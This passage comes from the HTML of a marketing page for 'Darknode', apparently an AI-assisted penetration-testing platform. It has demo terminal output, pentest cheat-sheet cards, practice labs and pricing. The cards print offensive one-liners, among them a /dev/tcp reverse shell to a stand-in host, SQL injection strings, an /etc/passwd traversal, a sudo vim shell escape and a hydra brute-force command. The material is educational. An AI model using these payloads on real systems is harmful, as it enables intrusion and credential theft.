<span class="c-ok">3306</span>    open   mysql         MySQL 5.7.38
<span class="c-ok">8080</span>    open   http-proxy    Jetty 9.4.43

<span class="c-acc">[+] 5 open ports found on 10.10.14.7</span>
<span class="c-mut">[*] OS detection: Linux 5.x (96% confidence)</span>
<span class="c-mut">[*] Scan completed in 14.2s</span>
<span class="c-acc">[+] Results saved to ./scans/10.10.14.7.json</span></span><span class="showcase-panel" id="stab-analysis" role="tabpanel" aria-labelledby="tab-analysis" hidden><span class="c-pl">$</span> darknode nexus "analyze the scan results for vulnerabilities"

<span class="c-acc">Nexus:</span> Analyzing scan output for 10.10.14.7...

<span class="c-ok">CRITICAL FINDINGS:</span>

<span class="c-bad">1. MySQL 5.7.38 (port 3306)</span>
   End-of-life version. Multiple known CVEs including
   CVE-2023-21977 (privilege escalation) and
   CVE-2022-21515 (denial of service).
   Publicly exposed on a non-standard config.

<span class="c-bad">2. Apache 2.4.52 (ports 80, 443)</span>
   Vulnerable to CVE-2022-31813 (mod_proxy bypass)
   and CVE-2022-28615 (out-of-bounds read).
   Recommend upgrade to 2.4.58+.

<span class="c-pl">3. Jetty 9.4.43 (port 8080)</span>
   Check for CVE-2023-26048 (multipart DoS).
   Often fronts Jenkins, Nexus, or Solr instances.

<span class="c-mut">engine: ollama/llama3 (local, free)</span></span><span class="showcase-panel" id="stab-exploit" role="tabpanel" aria-labelledby="tab-exploit" hidden><span class="c-pl">$</span> darknode nexus "suggest assessment approach"

<span class="c-acc">Nexus:</span> Based on the findings, here is a recommended
testing methodology for 10.10.14.7:

<span class="c-ok">PHASE 1 -- Enumeration</span>
  <span class="c-pl">></span> Enumerate Apache vhosts and directories
    <span class="c-mut">$ darknode gobuster 10.10.14.7</span>
  <span class="c-pl">></span> Check Jetty 8080 for admin panels
    <span class="c-mut">$ darknode probe http://10.10.14.7:8080</span>

<span class="c-ok">PHASE 2 -- Testing</span>
  <span class="c-pl">></span> Test MySQL for default/weak credentials
    <span class="c-mut">$ darknode auth-test mysql://10.10.14.7</span>
  <span class="c-pl">></span> Check mod_proxy SSRF via CVE-2022-31813
  <span class="c-pl">></span> Probe Jetty for unauthenticated endpoints

<span class="c-ok">PHASE 3 -- Verification</span>
  <span class="c-pl">></span> If MySQL access: verify scope, document
  <span class="c-pl">></span> If web access: check privilege boundaries

<span class="c-mut">engine: ollama/llama3 (local, free)</span></span><span class="showcase-panel" id="stab-report" role="tabpanel" aria-labelledby="tab-report" hidden><span class="c-pl">$</span> darknode report --target 10.10.14.7

<span class="c-mut">[*] Generating security assessment report...</span>
<span class="c-mut">[*] Compiling scan data, findings, and recommendations</span>

<span class="c-acc">====================================</span>
<span class="c-acc">  PENETRATION TEST REPORT</span>
<span class="c-acc">  Target: 10.10.14.7</span>
<span class="c-acc">  Date:   2026-09-07</span>
<span class="c-acc">  Risk:   <span class="c-bad">HIGH</span></span>
<span class="c-acc">====================================</span>

  Executive Summary:
  5 services identified. 2 critical vulnerabilities
  found in MySQL and Apache. Immediate patching
  recommended. MySQL instance should not be
  publicly accessible.

  <span class="c-ok">Findings:  3 critical, 1 medium, 1 info</span>
  <span class="c-ok">Pages:     12</span>
  <span class="c-ok">Format:    PDF + Markdown</span>

<span class="c-acc">[+] Report saved to ./reports/10.10.14.7.pdf</span>
<span class="c-acc">[+] Markdown copy: ./reports/10.10.14.7.md</span>
<span class="c-mut">[*] Done in 3.8s</span></span></pre>
          </div>
        </div>
        <div class="showcase-hint">
          <span class="showcase-step-dots">
            <span class="showcase-dot active" data-tab="recon"></span>
            <span class="showcase-dot" data-tab="analysis"></span>
            <span class="showcase-dot" data-tab="exploit"></span>
            <span class="showcase-dot" data-tab="report"></span>
          </span>
        </div>
      </div>
    </section>

    <!-- ====== SECURITY KNOWLEDGE ====== -->
    <section class="section" id="security-knowledge" aria-labelledby="rag-title">
      <div class="wrap">
        <div class="sec-label">Security RAG</div>
        <h2 class="sec-title" id="rag-title">Built-in security knowledge</h2>
        <p class="sec-sub">Not a generic chatbot. Nexus ships with a deep, structured knowledge base covering real-world security techniques, OWASP standards, and professional tooling.</p>
        <div class="rag-tabs" role="tablist" aria-label="Knowledge categories">
          <button class="rag-tab active" role="tab" aria-selected="true" data-rag="owasp">OWASP Top 10</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="attacks">Security Patterns</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="tools">Cheat Sheets</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="privesc">Privilege Escalation</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="recon">Network Recon</button>
        </div>

        <div class="rag-panel active" data-rag-panel="owasp">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Broken Access Control</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Insecure direct object references (IDOR), missing function-level authorization checks, and path traversal. Unauthorized users may modify identifiers to access other users' data.</p>
              <div class="rag-code"><code>GET /api/user/124  -->  GET /api/user/125</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Injection</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>SQL injection, command injection, and cross-site scripting. Unsanitized user input is interpreted as code by the backend or database engine.</p>
              <div class="rag-code"><code>' OR 1=1 --</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Security Misconfiguration</h3>
                <span class="sev high">High</span>
              </div>
              <p>Default credentials left in production, debug mode enabled, missing security headers, unnecessary services exposed. The most common class of real-world findings.</p>
              <div class="rag-code"><code>X-Powered-By: Express\nServer: Apache/2.4.49</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Cryptographic Failures</h3>
                <span class="sev high">High</span>
              </div>
              <p>Weak or missing encryption for data in transit and at rest. Deprecated algorithms, hardcoded secrets, and exposed sensitive data in logs or error messages.</p>
              <div class="rag-code"><code>Set-Cookie: session=abc123  (missing Secure; HttpOnly)</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="attacks">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Authentication Bypass</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>SQL injection in login forms, default credentials, JWT manipulation, and comment-based truncation. Bypasses authentication entirely without valid credentials.</p>
              <div class="rag-code"><code>admin' --\n' OR 1=1 --\n' UNION SELECT null,null --</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Remote Access</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Technique establishing an outbound connection from a target system back to a testing listener, granting interactive shell access for assessment.</p>
              <div class="rag-code"><code>bash -i >& /dev/tcp/TESTER/4444 0>&1</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Directory Traversal</h3>
                <span class="sev high">High</span>
              </div>
              <p>Path manipulation to escape the web root and read arbitrary files on the server. Targets configuration files, credentials, and system internals.</p>
              <div class="rag-code"><code>GET /download?file=../../../etc/passwd</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="tools">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Nmap Service Scan</h3>
                <span class="sev medium">Medium</span>
              </div>
              <p>Network mapper with version detection. Identifies open ports, running services, and OS fingerprints. The first step in any engagement's reconnaissance phase.</p>
              <div class="rag-code"><code>nmap -sV -sC -O -p- 10.10.14.7</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>SQLMap Automated Injection</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Automated SQL injection testing and database assessment. Detects injection points, enumerates databases, reads files, and tests access controls on target applications.</p>
              <div class="rag-code"><code>sqlmap -u "http://target/page?id=1" --dbs --batch</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Gobuster Directory Discovery</h3>
                <span class="sev medium">Medium</span>
              </div>
              <p>High-speed directory and file enumeration using wordlists. Discovers hidden admin panels, backup files, API endpoints, and configuration files.</p>
              <div class="rag-code"><code>gobuster dir -u http://target -w /usr/share/wordlists/common.txt</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Hydra Credential Testing</h3>
                <span class="sev high">High</span>
              </div>
              <p>Online credential tester supporting 50+ protocols. Tests credential pairs against SSH, FTP, HTTP forms, databases, and other network services.</p>
              <div class="rag-code"><code>hydra -l admin -P rockyou.txt ssh://10.10.14.7</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="privesc">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>SUID Binary Analysis</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Finding binaries with the SUID bit set that could allow privilege escalation from a low-privilege user to root. Common findings include custom scripts and misconfigured system utilities.</p>
              <div class="rag-code"><code>find / -perm -4000 -type f 2>/dev/null</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Sudo Misconfigurations</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Identifying overly permissive sudo rules. Users allowed to run specific binaries as root without password may be able to escalate privileges through those binaries.</p>
              <div class="rag-code"><code>sudo -l\nsudo vim -c ':!/bin/bash'</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Cron Job Hijacking</h3>
                <span class="sev high">High</span>
              </div>
              <p>Identifying writable scripts executed by root cron jobs. Replacing or appending to these scripts grants code execution as root on the next scheduled run.</p>
              <div class="rag-code"><code>cat /etc/crontab\nls -la /var/spool/cron/</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="recon">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Subdomain Enumeration</h3>
                <span class="sev medium">Medium</span>
              </div>
              <p>Discovering hidden subdomains through DNS brute-forcing, certificate transparency logs, and passive OSINT sources. Expands the scope of assessment significantly.</p>
              <div class="rag-code"><code>subfinder -d target.com -silent | httpx -title -status-code</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>DNS Zone Transfer</h3>
                <span class="sev high">High</span>
              </div>
              <p>Attempting AXFR requests against misconfigured DNS servers. A successful transfer reveals every record in the zone -- hosts, mail servers, internal infrastructure.</p>
              <div class="rag-code"><code>dig axfr @ns1.target.com target.com</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>SMB Enumeration</h3>
                <span class="sev high">High</span>
              </div>
              <p>Enumerating Windows shares, users, and groups through the SMB protocol. Discovers open shares, null sessions, and credentials stored in accessible file shares.</p>
              <div class="rag-code"><code>enum4linux -a 10.10.14.7\nsmbclient -L //10.10.14.7 -N</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Web Technology Fingerprinting</h3>
                <span class="sev medium">Medium</span>
              </div>
              <p>Identifying frameworks, CMS platforms, server software, and client-side libraries. Guides assessment planning by revealing the exact technology stack in use.</p>
              <div class="rag-code"><code>whatweb http://target.com -v\nwappalyzer http://target.com</code></div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== PRACTICE LABS ====== -->
    <section class="section alt" id="labs" aria-labelledby="labs-title">
      <div class="wrap">
        <div class="sec-label">Hands-on training</div>
        <h2 class="sec-title" id="labs-title">Practice on real vulnerable apps</h2>
        <p class="sec-sub">Spin up intentionally vulnerable environments and test them safely. Reset anytime. Learn by finding and understanding real flaws.</p>
        <div class="plab-grid">
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">Docker</span>
            </div>
            <h3 class="plab-name">DVWA</h3>
            <p class="plab-desc">Damn Vulnerable Web App &mdash; SQLi, XSS, CSRF, file upload, command injection. The classic training ground.</p>
            <span class="plab-diff beginner">Beginner</span>
          </div>
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">Docker</span>
            </div>
            <h3 class="plab-name">Juice Shop</h3>
            <p class="plab-desc">OWASP modern web app with 100+ challenges across injection, broken auth, XSS, and insecure deserialization.</p>
            <span class="plab-diff beginner">Beginner</span>
          </div>
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">Docker</span>
            </div>
            <h3 class="plab-name">WebGoat</h3>
            <p class="plab-desc">OWASP guided lessons covering A1&ndash;A10 vulnerabilities with built-in hints and explanations.</p>
            <span class="plab-diff beginner">Beginner</span>
          </div>
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">VM</span>
            </div>
            <h3 class="plab-name">Metasploitable</h3>
            <p class="plab-desc">Intentionally vulnerable Linux VM. Practice network enumeration, privilege analysis, and security assessment chains.</p>
            <span class="plab-diff intermediate">Intermediate</span>
          </div>
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">VM</span>
            </div>
            <h3 class="plab-name">VulnHub machines</h3>
            <p class="plab-desc">50+ downloadable VMs with varying difficulty. Full boot-to-root practice for OSCP-style methodology.</p>
            <span class="plab-diff intermediate">Intermediate</span>
          </div>
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">Browser</span>
            </div>
            <h3 class="plab-name">HackTheBox-style challenges</h3>
            <p class="plab-desc">CTF-format exercises covering cryptography, reverse engineering, forensics, and web security.</p>
            <span class="plab-diff advanced">Advanced</span>
          </div>
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">Adapter required</span>
            </div>
            <h3 class="plab-name">Wireless lab</h3>
            <p class="plab-desc">WiFi security assessment &mdash; WPA/WPA2 testing, rogue AP detection, and wireless analysis.</p>
            <span class="plab-diff advanced">Advanced</span>
          </div>
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">Docker</span>
            </div>
            <h3 class="plab-name">API security lab</h3>
            <p class="plab-desc">REST and GraphQL vulnerability practice &mdash; broken auth, BOLA, injection, rate limiting, and SSRF.</p>
            <span class="plab-diff intermediate">Intermediate</span>
          </div>
        </div>
        <p class="plab-note">All labs run locally in Docker or VirtualBox. Nothing touches the internet.</p>
      </div>
    </section>

    <!-- ====== COMPARISON TABLE ====== -->
    <section class="section" id="compare" aria-labelledby="compare-title">
      <div class="wrap">
        <div class="sec-label">How we compare</div>
        <h2 class="sec-title" id="compare-title">Darknode vs. the alternatives</h2>
        <p class="sec-sub">One platform. Zero compromises.</p>
        <div class="cmp-scroll">
          <table class="cmp-landing" aria-label="Feature comparison between Darknode and alternatives">
            <thead>
              <tr>
                <th class="cmp-feature-col">Feature</th>
                <th class="cmp-dn-col">Darknode</th>
                <th>Kali Linux</th>
                <th>HackTheBox</th>
                <th>TryHackMe</th>
                <th>Burp Suite</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>Price</td>
                <td class="cmp-dn"><span class="cmp-highlight">Free forever</span></td>
                <td>Free</td>
                <td>$49/mo</td>
                <td>$14/mo</td>
                <td>$449/yr</td>
              </tr>
              <tr>
                <td>AI security agent</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span> 59 modules, 8 backends</td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
              </tr>
              <tr>
                <td>100% local and private</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-x">&mdash;</span> Cloud only</td>
                <td><span class="cmp-x">&mdash;</span> Cloud only</td>
                <td>Local install</td>
              </tr>
              <tr>
                <td>Security tools</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span> 164+ built-in</td>
                <td>600+ (CLI)</td>
                <td>Limited</td>
                <td>Limited</td>
                <td>1 (proxy)</td>
              </tr>
              <tr>
                <td>Interactive labs</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span> Cyber Range</td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
              </tr>
              <tr>
                <td>Threat intelligence</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span> Live feeds</td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
              </tr>
              <tr>
                <td>Report generation</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span> AI-powered</td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-check">&check;</span></td>
              </tr>
              <tr>
                <td>Works offline</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-check">&check;</span></td>
              </tr>
              <tr>
                <td>Custom OS</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span> 2 editions</td>
                <td><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
                <td><span class="cmp-x">&mdash;</span></td>
              </tr>
              <tr>
                <td>Web GUI</td>
                <td class="cmp-dn"><span class="cmp-check">&check;</span> Full SPA</td>
                <td><span class="cmp-x">&mdash;</span> CLI only</td>
                <td><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-check">&check;</span></td>
                <td><span class="cmp-check">&check;</span></td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </section>

    <!-- ====== DARKNODE OS ====== -->
    <section class="section alt" id="darknode-os" aria-labelledby="os-title">
      <div class="wrap">
        <div class="sec-label">Darknode OS</div>
        <h2 class="sec-title" id="os-title">Your own security operating system</h2>
        <p class="sec-sub">Two editions — a custom x86 kernel built from scratch, and a full Linux desktop. Both free and open source.</p>
        <div class="os-grid">
          <div class="os-card">
            <div class="os-card-icon"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
            <h3 class="os-card-title">Darknode OS — Custom Kernel</h3>
            <p class="os-card-desc">Built from scratch. No Linux, no borrowed code. A real x86 operating system with its own kernel, shell, filesystem, and full TCP/IP networking stack.</p>
            <ul class="os-features">
              <li>Multiboot2 boot &rarr; GRUB bootloader</li>
              <li>VGA console, PS/2 keyboard, PIT timer</li>
              <li>Physical memory manager + heap allocator</li>
              <li>VFS, ramfs, devfs filesystems</li>
              <li>Round-robin process scheduler</li>
              <li>ATA disk + NE2000 NIC drivers</li>
              <li>Ethernet, ARP, IPv4, ICMP, UDP, DHCP, DNS</li>
              <li>28-command built-in shell</li>
            </ul>
            <div class="os-card-meta">12 MB &middot; Boots in VirtualBox &amp; QEMU</div>
            <a href="https://github.com/Darknode-Official/darknode-os/releases/download/v0.1.0/darknode-os.iso" class="btn lg os-dl" target="_blank" rel="noopener">Download ISO</a>
          </div>
          <div class="os-card">
            <div class="os-card-icon"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg></div>
            <h3 class="os-card-title">Darknode OS — Linux Edition</h3>
            <p class="os-card-desc">Full desktop environment built on Ubuntu 24.04 LTS. Pre-loaded with the entire Darknode toolkit, Nexus AI agent, and every security tool configured and ready to go.</p>
            <ul class="os-features">
              <li>Ubuntu 24.04 LTS with XFCE desktop</li>
              <li>Darknode CLI + Nexus pre-installed</li>
              <li>nmap, sqlmap, nuclei, ffuf, httpx, Burp Suite</li>
              <li>164+ security tools ready to run</li>
              <li>Custom wallpapers, icons, and theming</li>
              <li>Cloud-init auto-provisioning on first boot</li>
            </ul>
            <div class="os-card-meta">370 MB download &middot; Self-provisions on first boot</div>
            <a href="https://github.com/Darknode-Official/darknode-os/releases/download/v1.0.0/darknode-os-ubuntu-slim.qcow2.xz" class="btn lg os-dl" target="_blank" rel="noopener">Download qcow2</a>
          </div>
        </div>
        <div class="os-boot-preview">
          <div class="term-window">
            <div class="term-bar"><span class="term-dot"></span><span class="term-dot"></span><span class="term-dot"></span><span class="term-title">darknode-os</span></div>
            <pre class="term-body">
  ____             _                     _        ___  ____
 |  _ \\  __ _ _ __| | ___ __   ___   __| | ___  / _ \\/ ___|
 | | | |/ _\` | '__| |/ / '_ \\ / _ \\ / _\` |/ _ \\| | | \\___ \\
 | |_| | (_| | |  |   &lt;| | | | (_) | (_| |  __/| |_| |___) |
 |____/ \\__,_|_|  |_|\\_\\_| |_|\\___/ \\__,_|\\___| \\___/|____/

 Darknode OS v0.1.0 — Custom x86 Kernel
 Memory: 128 MB | Timer: 1000 Hz | Disk: ATA PIO
 Network: NE2000 NIC | Stack: IPv4/ICMP/UDP/DHCP/DNS
 Filesystems: ramfs, devfs mounted

 darknode&gt; help
 Available commands (28):
   help ls cat mkdir touch write rm cd pwd ps mount
   disk free mem cpuinfo time uptime echo version
   clear reboot shutdown ifconfig ping arp dhcp dns netstat

 darknode&gt; _</pre>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== TESTIMONIALS ====== -->
    <section class="section" id="testimonials" aria-labelledby="testimonials-title">
      <div class="wrap">
        <div class="sec-label">Testimonials</div>
        <h2 class="sec-title" id="testimonials-title">Trusted by security professionals</h2>
        <p class="sec-sub">From students to red team leads, here is what people are saying about Darknode.</p>
        <div class="testimonial-grid">
          <div class="testimonial-card">
            <div class="testimonial-quote">&ldquo;</div>
            <blockquote class="testimonial-text">Finally a security platform that runs entirely on my machine. No cloud lock-in.</blockquote>
            <div class="testimonial-author">
              <div class="testimonial-role">Security Engineer</div>
              <div class="testimonial-org">Enterprise Security</div>
            </div>
          </div>
          <div class="testimonial-card">
            <div class="testimonial-quote">&ldquo;</div>
            <blockquote class="testimonial-text">The AI agent found a misconfigured S3 bucket in our staging environment within minutes.</blockquote>
            <div class="testimonial-author">
              <div class="testimonial-role">DevOps Lead</div>
              <div class="testimonial-org">Cloud Infrastructure</div>
            </div>
          </div>
          <div class="testimonial-card">
            <div class="testimonial-quote">&ldquo;</div>
            <blockquote class="testimonial-text">I passed my OSCP using Darknode's practice labs and AI-guided methodology.</blockquote>
            <div class="testimonial-author">
              <div class="testimonial-role">Security Professional</div>
              <div class="testimonial-org">OSCP Certified</div>
            </div>
          </div>
          <div class="testimonial-card">
            <div class="testimonial-quote">&ldquo;</div>
            <blockquote class="testimonial-text">The cheat sheets alone saved me hours. Having the AI explain each technique is next level.</blockquote>
            <div class="testimonial-author">
              <div class="testimonial-role">CS Student</div>
              <div class="testimonial-org">University</div>
            </div>
          </div>
          <div class="testimonial-card">
            <div class="testimonial-quote">&ldquo;</div>
            <blockquote class="testimonial-text">We replaced three commercial tools with Darknode. The fact that it's free is unreal.</blockquote>
            <div class="testimonial-author">
              <div class="testimonial-role">Red Team Lead</div>
              <div class="testimonial-org">Security Consulting</div>
            </div>
          </div>
          <div class="testimonial-card">
            <div class="testimonial-quote">&ldquo;</div>
            <blockquote class="testimonial-text">The Nexus AI agent writes better Nuclei templates than most of my team.</blockquote>
            <div class="testimonial-author">
              <div class="testimonial-role">Security Researcher</div>
              <div class="testimonial-org">Vulnerability Research</div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== PRICING ====== -->
    <section class="section alt" id="pricing" aria-labelledby="pricing-title">
      <div class="wrap">
        <div class="sec-label">Pricing</div>
        <h2 class="sec-title" id="pricing-title">Free to start. Upgrade when you're ready.</h2>
        <p class="sec-sub">Bring your own AI key on any plan. Paid plans unlock platform features, not AI access.</p>
        <div class="billing-toggle">
          <label id="bill-monthly" class="active">Monthly</label>
          <button class="billing-switch" id="billing-switch" type="button" aria-label="Toggle annual billing"></button>
          <label id="bill-annual">Annual</label>
          <span class="billing-save">Save up to 33%</span>
        </div>
        <div class="pricing-grid" id="pricing-grid">
          <div class="price-card">
            <div class="price-tier">Free</div>
            <div class="price-amount">$0<span class="price-period">/forever</span></div>
            <p class="price-desc">The full platform. No limits, no trials, no paywalls.</p>
            <ul class="price-features">
              <li>All 164+ security tools (no limits)</li>
              <li>PROMETHEUS, SENTINEL EYE, HYDRA, AEGIS &mdash; full access</li>
              <li>Nexus AI agent (BYOK &mdash; Claude, GPT, Gemini, Ollama)</li>
              <li>Academy with 1,400+ topics and quizzes</li>
              <li>CLI, desktop app, and Darknode OS</li>
              <li>Live threat intelligence feeds</li>
              <li>Unlimited scans and analysis</li>
              <li>Community Discord support</li>
            </ul>
            <button class="btn lg" id="price-free">Get started free</button>
          </div>
          <div class="price-card featured">
            <div class="price-badge">Recommended</div>
            <div class="price-tier">Pro</div>
            <div class="price-amount price-monthly" data-monthly="$12" data-annual="$99">$12<span class="price-period">/month</span></div>
            <div class="price-amount price-annual" data-monthly="$12" data-annual="$99">$99<span class="price-period">/year</span> <span class="price-saved">Save $45</span></div>
            <p class="price-desc">Built for working security professionals.</p>
            <ul class="price-features compact">
              <li>Everything in Free, plus:</li>
              <li>Automated scan scheduling (daily/weekly/monthly)</li>
              <li>Vulnerability tracker with severity trends</li>
              <li>Threat watchlist with real-time alerts</li>
              <li>AI-powered security report writer</li>
              <li>AI code auditor</li>
              <li>Custom scan profiles and templates</li>
              <li>Credential leak monitoring</li>
              <li>Nexus Overnight Mode (background analysis)</li>
              <li>Priority API rate limits (5x)</li>
              <li>Early access to new tools</li>
              <li>Email support (24h response)</li>
            </ul>
            <button class="btn lg ghost" id="price-pro">Join waitlist</button>
          </div>
          <div class="price-card">
            <div class="price-tier">Team</div>
            <div class="price-amount price-monthly" data-monthly="$25" data-annual="$199">$25<span class="price-period">/user/month</span></div>
            <div class="price-amount price-annual" data-monthly="$25" data-annual="$199">$199<span class="price-period">/user/year</span> <span class="price-saved">Save $101</span></div>
            <p class="price-desc">Collaborate, compete, and train as a team.</p>
            <ul class="price-features compact">
              <li>Everything in Pro, plus:</li>
              <li>Shared workspace and findings</li>
              <li>Team CTF builder with scoring</li>
              <li>Asset inventory and shared scan history</li>
              <li>Activity feed and leaderboard</li>
              <li>Role-based permissions</li>
              <li>Branded security reports (custom logo)</li>
              <li>Engagement and project management</li>
              <li>Findings deduplication and tracking</li>
              <li>Export to Jira, GitHub, Linear, CSV</li>
              <li>Plugin system and SDK</li>
              <li>Priority chat support (4h response)</li>
            </ul>
            <button class="btn lg ghost" id="price-team">Join waitlist</button>
          </div>
          <div class="price-card">
            <div class="price-tier">Enterprise</div>
            <div class="price-amount">Custom</div>
            <p class="price-desc">Control, compliance, and scale for organizations.</p>
            <ul class="price-features compact">
              <li>Everything in Team, plus:</li>
              <li>SSO and SAML authentication</li>
              <li>Data isolation and tenant separation</li>
              <li>Role-based access control (RBAC)</li>
              <li>Audit logging and compliance exports (SOC2, PCI-DSS, HIPAA)</li>
              <li>Self-hosted and air-gapped deployment</li>
              <li>Custom Darknode OS builds (org-branded)</li>
              <li>Admin dashboard and analytics</li>
              <li>User provisioning (SCIM)</li>
              <li>Dedicated account manager</li>
              <li>99.9% SLA guarantee</li>
              <li>Volume licensing and invoicing</li>
            </ul>
            <button class="btn lg ghost" id="price-enterprise">Contact sales</button>
          </div>
        </div>
        <p class="pricing-note">Every tool on the platform is <strong>free forever</strong> &mdash; all 164+ security tools, command centers, the CLI, desktop app, Darknode OS, and live threat feeds. You never pay for AI tokens &mdash; bring your own key or run Ollama locally for free. Paid plans add <strong>professional-grade features</strong> like automated scan scheduling, vulnerability tracking, AI report generation, credential leak monitoring, and team collaboration. No hidden fees, no usage caps, cancel anytime.</p>
      </div>
    </section>

    <!-- ====== FAQ ====== -->
    <section class="section" id="faq" aria-labelledby="faq-title">
      <div class="wrap">
        <div class="sec-label">FAQ</div>
        <h2 class="sec-title" id="faq-title">Frequently asked questions</h2>
        <div class="faq-list">

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Is Darknode really free?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Yes. Every tool on the platform &mdash; HYDRA, AEGIS, SENTINEL EYE, PROMETHEUS, PHANTOM, CITADEL, ORACLE, SPECTRE, the Security Assessment Console, Cyber Range, all 164+ security tools, the CLI, the desktop app, and Darknode OS &mdash; is free with no time limits, no trials, and no paywalls. You also get full access to the Nexus AI agent on any plan using your own API key or a free local model like Ollama. Paid plans (coming soon) will add professional extras like automated scan scheduling, AI report generation, and team collaboration, but the core platform stays free forever.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Does my data leave my computer?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">No. Darknode is designed with privacy at its core. All scans, analysis, and practice labs run entirely on your machine. If you use the Nexus AI agent with a local model (via Ollama), everything stays offline. If you bring a cloud API key (OpenAI, Anthropic, Google), your queries go directly to that provider &mdash; Darknode never proxies, logs, or stores your prompts or results. Your scan data, saved findings, credentials, and wordlists are stored locally and never transmitted anywhere.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">What AI models does Darknode support?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
